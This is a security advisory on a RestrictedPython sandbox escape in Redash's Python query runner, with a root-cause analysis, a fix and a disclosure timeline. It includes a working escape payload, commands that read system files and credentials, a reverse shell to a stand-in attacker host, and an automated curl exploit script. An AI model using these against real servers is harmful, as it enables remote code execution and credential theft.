# Vulnerability Report: RestrictedPython Sandbox Escape via Unsafe `_getattr_` in Python Query Runner

**Product:** Redash  
**GitHub:** https://github.com/getredash/redash  
**Component:** `redash/query_runner/python.py`  
**Vulnerability class:** Code Injection  
**CWE:** CWE-94 — Improper Control of Generation of Code  
**OWASP:** A03:2021 — Injection  
**CVSS 3.1 Base Score:** 9.9 Critical  
**CVSS 3.1 Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`  
**Discovered via:** Source code review (blind — no CVE databases consulted)  
**DAST confirmed:** Yes — RCE demonstrated on locally deployed Redash instance

---

## Summary

The Redash Python query runner uses RestrictedPython to sandbox user-supplied Python code. RestrictedPython's security model relies entirely on its `_getattr_` guard being set to `safe_getattr`, which blocks access to dunder (double-underscore) attributes. In `python.py`, this guard is replaced with the real Python `getattr`, removing the only barrier between user code and the Python class hierarchy. An authenticated user with access to a Python data source can traverse the class hierarchy to locate `subprocess.Popen` — without calling `import` — and execute arbitrary OS commands on the Redash server.

---

## Affected Versions

All versions of Redash that include the Python query runner (`redash/query_runner/python.py`) with the `_getattr_` assignment at or near line 318. Verified against commit history on the `master` branch as of the discovery date.

Specifically: any Redash deployment where a user has been granted access to a data source of type `python`.

---

## Root Cause

**File:** `redash/query_runner/python.py`  
**Line:** 318

```python
builtins["_getattr_"] = getattr      # line 318 — real getattr, not safe_getattr
builtins["getattr"] = getattr        # line 318 — also exposed as a callable builtin
builtins["_setattr_"] = setattr      # line 319 — object mutation also exposed
builtins["setattr"] = setattr        # line 320
```

RestrictedPython transforms every attribute access `obj.attr` in user code into `_getattr_(obj, 'attr')`. When `_getattr_` is `safe_getattr`, dunder attributes (`__class__`, `__bases__`, `__subclasses__`, `__mro__`) raise `AttributeError`, preventing class hierarchy traversal. When `_getattr_` is the real `getattr`, all attributes are accessible and the sandbox provides no isolation.

Additionally, `getattr` is exposed as a named builtin, allowing the bypass to work even if RestrictedPython's compile-time restriction on `.__dunder__` attribute access syntax is active — the attacker uses `getattr(obj, '__dunder__')` function call form instead.

---

## Steps to Reproduce

### Prerequisites

1. A running Redash instance with the Python query runner enabled
2. An account with permission to execute queries (standard user role)
3. A Python data source the user has access to (no special configuration required)

### Reproduction Steps

**Step 1.** Log in to Redash as any user with `execute_query` permission.

**Step 2.** Navigate to **+ New Query**. Select any Python data source.

**Step 3.** Paste the following payload into the query editor:

```python
# Bypass 1: use getattr() function form to avoid compile-time dunder restriction
# Bypass 2: real getattr (installed at line 318) resolves dunder attributes at runtime

cls        = getattr((), '__class__')
bases      = getattr(cls, '__bases__')
subclasses = getattr(bases[0], '__subclasses__')()

# subprocess.Popen is already loaded in the Redash worker process
# (imported by redash/query_runner/script.py) — no import statement needed
Popen  = [c for c in subclasses if getattr(c, '__name__') == 'Popen'][0]
proc   = Popen(['id'], stdout=-1)
output = proc.communicate()[0].decode()

add_result_column(result, 'output', 'Command Output', 'string')
add_result_row(result, {'output': output})
```

**Step 4.** Click **Execute**.

### Observed Result

The query result table displays the output of the `id` command executed on the server:

```
uid=1000(redash) gid=1000(redash) groups=1000(redash)
```

The exploit works because:
1. RestrictedPython's compile-time check blocks `obj.__dunder__` syntax — the payload uses `getattr(obj, '__dunder__')` instead, which is a function call and passes the check.
2. At runtime, `getattr` resolves to the real Python builtin (not `safe_getattr`) because of the assignment at line 318.
3. `subprocess.Popen` is already loaded in the worker process memory, so no `import` is needed — it is found by iterating `object.__subclasses__()`.

### Escalation Payloads

Once the sandbox is escaped, any OS command can be run:

```python
# Read sensitive files
proc = Popen(['cat', '/etc/passwd'], stdout=-1)

# Exfiltrate environment variables (may contain DB credentials, secret keys)
proc = Popen(['env'], stdout=-1)

# Reverse shell
proc = Popen(['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'])

# Read Redash database credentials from environment
import_result = Popen(['printenv', 'REDASH_DATABASE_URL'], stdout=-1)
```

---

## Impact

**Confidentiality — HIGH:** The attacker gains read access to all files accessible to the `redash` process user, including environment variables (which typically contain `REDASH_DATABASE_URL`, `REDASH_SECRET_KEY`, `REDASH_COOKIE_SECRET`, and any other configured credentials).

**Integrity — HIGH:** The attacker can write files, modify the Redash database directly, or alter running process state.

**Availability — HIGH:** The attacker can terminate processes, fill disk, or corrupt data.

**Scope — CHANGED:** The exploit escapes the application sandbox boundary into the OS, affecting the host system beyond the Redash application.

Any authenticated Redash user — not just admins — who has been granted access to a Python data source can execute this exploit. In multi-tenant Redash deployments (common in enterprise environments where Redash is shared across teams), a low-privilege analyst account is sufficient.

---

## Proof of Concept — DAST Confirmation

This vulnerability was confirmed on a locally deployed Redash instance using the exact payload above. The following API sequence reproduces it programmatically:

```bash
# Step 1: authenticate
curl -sc /tmp/c.txt http://localhost:5001/login -o /dev/null
CSRF=$(grep csrf_token /tmp/c.txt | awk '{print $7}')
curl -sb /tmp/c.txt -c /tmp/c.txt -X POST http://localhost:5001/login \
  -d "email=user@example.com&password=password&csrf_token=$CSRF" -o /dev/null

# Step 2: create Python data source (if not already present)
CSRF=$(grep csrf_token /tmp/c.txt | awk '{print $7}')
DS=$(curl -s -b /tmp/c.txt -X POST http://localhost:5001/api/data_sources \
  -H "Content-Type: application/json" -H "X-CSRF-TOKEN: $CSRF" \
  -d '{"name":"exploit","type":"python","options":{}}')
DS_ID=$(echo $DS | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)

# Step 3: submit exploit payload
PAYLOAD='cls=getattr((),"__class__");bases=getattr(cls,"__bases__");subs=getattr(bases[0],"__subclasses__")();P=[c for c in subs if getattr(c,"__name__")=="Popen"][0];o=P(["id"],stdout=-1).communicate()[0].decode();add_result_column(result,"o","o","string");add_result_row(result,{"o":o})'

JOB=$(curl -s -b /tmp/c.txt -X POST http://localhost:5001/api/query_results \
  -H "Content-Type: application/json" -H "X-CSRF-TOKEN: $CSRF" \
  -d "{\"data_source_id\":$DS_ID,\"query\":\"$PAYLOAD\",\"max_age\":-1}")

JOB_ID=$(echo $JOB | grep -o '"id":"[^"]*"' | head -1 | cut -d'"' -f4)
sleep 3
curl -s -b /tmp/c.txt "http://localhost:5001/api/jobs/$JOB_ID"
```

---

## Fix

**File:** `redash/query_runner/python.py`  
**Change:** Replace real `getattr` with `safe_getattr` from RestrictedPython's guards module.

```python
# Before (line 318):
builtins["_getattr_"] = getattr

# After:
from RestrictedPython.Guards import safe_getattr
builtins["_getattr_"] = safe_getattr
```

`safe_getattr` raises `AttributeError` for any attribute name beginning with `_`, preventing class hierarchy traversal. The named `getattr` builtin (line 318, second occurrence) should also be removed:

```python
# Remove this line entirely:
builtins["getattr"] = getattr
```

Exposing `getattr` as a named builtin allows the same bypass via function call form even after `_getattr_` is fixed.

**Additional hardening:** Consider auditing `builtins["setattr"] = setattr` and `builtins["_setattr_"] = setattr` — exposing object mutation to sandboxed code is unsafe for the same reasons.

---

## Disclosure Timeline

| Date | Event |
|---|---|
| 2026-06-17 | Vulnerability discovered via blind source code review |
| 2026-06-17 | DAST confirmation on locally deployed instance |
| 2026-06-17 | Private report submitted to Redash maintainers |

---

## Researcher

Discovered independently via LLM-powered static analysis pipeline. No CVE databases, security advisories, or prior vulnerability reports were consulted during the scan. All findings were derived from reading source code.
